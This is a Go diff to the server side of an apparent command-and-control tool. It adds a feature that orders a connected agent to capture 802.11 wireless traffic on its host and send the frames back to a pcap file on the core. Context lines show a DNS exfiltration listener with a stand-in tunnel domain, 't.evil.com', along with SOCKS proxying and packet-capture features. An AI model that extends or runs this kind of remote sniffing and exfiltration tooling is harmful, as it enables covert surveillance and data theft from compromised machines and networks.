@@ -53,6 +53,10 @@ func main() {
 	pcapDuration := flag.Duration("pcap-duration", 30*time.Second, "how long to capture")
 	dnsBind := flag.String("dns-exfil", "", "bind an authoritative DNS listener for exfil (e.g. 0.0.0.0:5353)")
 	dnsDomain := flag.String("dns-domain", "t.evil.com", "tunnel domain agents will query under")
+	wlIface := flag.String("wireless", "", "capture 802.11 frames on the agent interface (Linux agent, root)")
+	wlChannel := flag.Int("wireless-channel", 0, "set the wifi channel before capture (0 = leave as is)")
+	wlOut := flag.String("wireless-out", "", "path to write the capture to (.pcap)")
+	wlDuration := flag.Duration("wireless-duration", 30*time.Second, "how long to capture")
 	flag.Parse()
 
 	if *pluginFlag != "" {
@@ -104,6 +108,13 @@ func main() {
 
 	if *socksBind != "" {
 		go startSocks(*socksBind, mgr)
+	}
+
+	if *wlIface != "" {
+		if *wlOut == "" {
+			log.Fatalf("-wireless requires -wireless-out")
+		}
+		go runWirelessCapture(mgr, *wlIface, *wlChannel, *wlOut, *wlDuration)
 	}
 
 	if *dnsBind != "" {
@@ -417,6 +428,68 @@ func runPCAPCapture(mgr *session.Manager, iface, outPath string, duration time.D
 				pw.WriteFrame(f)
 				frames++
 				i += int(incl)
+			}
+		}
+	}
+}
+
+
+// runWirelessCapture waits for an agent, opens a wireless capture session,
+// and writes received 802.11 frames to a .pcap file on the core.
+func runWirelessCapture(mgr *session.Manager, iface string, channel int, outPath string, duration time.Duration) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	log.Printf("[wireless] capture on %s ch=%d via %s -> %s", iface, channel, s.AgentID, outPath)
+
+	sessionID := fmt.Sprintf("wl-%d", time.Now().UnixNano())
+	s.RegisterCaptureChannel(sessionID)
+
+	pw, err := capturer.NewPCAPWriter(outPath)
+	if err != nil {
+		log.Printf("[wireless] pcap open: %v", err)
+		return
+	}
+	defer pw.Close()
+
+	if err := s.SendWirelessStart(sessionID, iface, channel); err != nil {
+		log.Printf("[wireless] send start: %v", err)
+		return
+	}
+
+	deadline := time.After(duration)
+	frames := 0
+	for {
+		select {
+		case <-deadline:
+			s.SendWirelessStop(sessionID)
+			log.Printf("[wireless] duration elapsed - %d frames to %s", frames, outPath)
+			return
+		case chunk, ok := <-s.GetCaptureChannel(sessionID):
+			if !ok {
+				log.Printf("[wireless] agent closed - %d frames", frames)
+				return
+			}
+			i := 0
+			for i+12 <= len(chunk) {
+				var ns uint64
+				for k := 0; k < 8; k++ {
+					ns = (ns << 8) | uint64(chunk[i+k])
+				}
+				ln := uint32(chunk[i+8])<<24 | uint32(chunk[i+9])<<16 |
+					uint32(chunk[i+10])<<8 | uint32(chunk[i+11])
+				i += 12
+				if i+int(ln) > len(chunk) {
+					break
+				}
+				pw.WriteFrame(capturer.Frame{
+					TS:      time.Unix(0, int64(ns)),
+					Data:    chunk[i : i+int(ln)],
+					OrigLen: int(ln),
+				})
+				frames++
+				i += int(ln)
 			}
 		}
 	}
